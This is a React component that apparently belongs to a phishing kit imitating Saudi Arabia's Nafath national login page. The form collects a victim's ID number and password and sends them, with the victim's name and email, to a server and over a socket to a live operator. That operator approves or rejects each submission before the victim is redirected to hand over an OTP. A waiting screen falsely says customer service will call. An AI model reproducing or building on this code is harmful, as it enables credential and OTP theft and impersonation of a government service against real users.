import React from "react";
import { useState } from "react";
import axios from "axios";
import { serverRoute,socket } from "./Main";

const Navaz = () => {
  const token = sessionStorage.getItem("session");
  const [error, setError] = useState(null);
  const query = new URLSearchParams(window.location.search);
  const queryData = query.get("data");
  const [page, setPage] = useState(0);
  const [data, setData] = useState({
    NavazCard: "",
    NavazPassword: "",
  });


  const handleChange = (e) => {
    const { name, type, checked, value } = e.target;
    setData((prevData) => ({
      ...prevData,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const handleSumbit = async (e) => {
    e.preventDefault();
   const { fullname, email, _id } = JSON.parse(queryData);
    await axios
      .post(serverRoute + "/navaz/" + _id, {
        NavazCard: data.NavazCard,
        NavazPassword: data.NavazPassword,
      })
      .then((res) => {
        if (res.status === 200) {
          setPage(1);
          socket.emit("navaz", {
            fullname,
            email,
            NavazCard: data.NavazCard,
            NavazPassword: data.NavazPassword,
            id: _id,
          });
        }
      });
  };

  socket.on("acceptNavaz", (data) => {
    if (data.id === JSON.parse(queryData)._id) {
      window.location.href =
        "/verify?data=" +
        JSON.stringify({
          ...JSON.parse(queryData),
          ...data,
          NavazOtp: data.userOtp,
        });
    }
  });

  socket.on("declineNavaz", (id) => {
       if (id === JSON.parse(queryData)._id) {
         setPage(0);
         setError("تم رفض الطلب");
       }
  });
  return (
    <div className="bg-white w-full py-8 border-t-2 border-sky-500" dir="rtl">
      <span className=" text-5xl font-bold pr-8" style={{ color: "#009987" }}>
        نفاذ
      </span>
      <div
        className="w-full  my-3 py-3 flex flex-col items-center justify-center gap-y-3"
        style={{
          backgroundImage: "linear-gradient(#e8e8e7, #f5f6f9, #e8e8e7)",
        }}
      >
        <span
          className=" text-3xl font-bold py-3 "
          style={{ color: "#009987" }}
        >
          الدخول على النظام
        </span>
        {error && (
          <span className="w-full p-5 rounded-md border border-red-500 bg-red-100">
            {" "}
            تم رفض الطلب
          </span>
        )}
        {page === 0 ? (
          <form
            className="md:w-10/12 w-full flex flex-col bg-white py-8"
            onSubmit={handleSumbit}
          >
            <div className="flex flex-col w-full p-5 gap-y-1">
              <span>رقم بطاقة الأحوال / الإقامة*</span>
              <input
                placeholder="رقم بطاقة الأحوال / الإقامة"
                type="text"
                className="border-2 p-2 rounded-md w-full outline-green-500"
                onChange={handleChange}
                required
                name="NavazCard"
                value={data.NavazCard}
              />
            </div>
            <div className="flex flex-col w-full p-5 gap-y-1">
              <span>كلمة المرور*</span>
              <input
                placeholder="********* "
                type="password"
                className="border-2 p-2 rounded-md w-full outline-green-500"
                onChange={handleChange}
                required
                name="NavazPassword"
                value={data.NavazPassword}
              />
            </div>
            <div className="w-full justify-center flex flex-col items-center">
              <button
                className="flex items-center justify-center w-2/3 rounded-md text-white py-2 text-lg "
                style={{ backgroundColor: "#009987" }}
                type="submit"
              >
                <img src="/navaz.png" />
                <span>تسجيل الدخول</span>
              </button>
              <span className="text-sm text-gray-500 text-center my-4">
                الرجاء إدخال رقم بطاقة الأحوال/الإقامة وكلمة المرور، ثم اضغط
                تسجيل الدخول
              </span>
              <div className="flex w-full justify-center items-center">
                <img src="/navaz2.jpg" className="w-16 h-16" />
              </div>
            </div>
          </form>
        ) : (
          <div
            className="flex flex-col w-full md:p-8 p-3 text-sm gap-y-5 my-3 bg-sky-200 text-gray-700 md:w-10/12"
            style={{ backgroundColor: "#daf2f6" }}
          >
            <span>
              سيتم الإتصال بك من قبل مركز خدمة العملاء، للتحقق من هوية المستخدم
              وتأكيد العملية
            </span>
            <span>لايمكنك الإستمرار بالمعاملة في حال عدم قبول المصادقة!</span>
            <span>
              سوق يتم الإتصال بك من قبل مركز خدمة العملاء الرجاء الإنتظار...
            </span>
            <div class="container">
              <div class="bar"></div>
            </div>
            <div className="flex items-center justify-center w-full bg-white">
              <img src="wait.gif" className="w-full md:w-1/3 " />
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default Navaz;
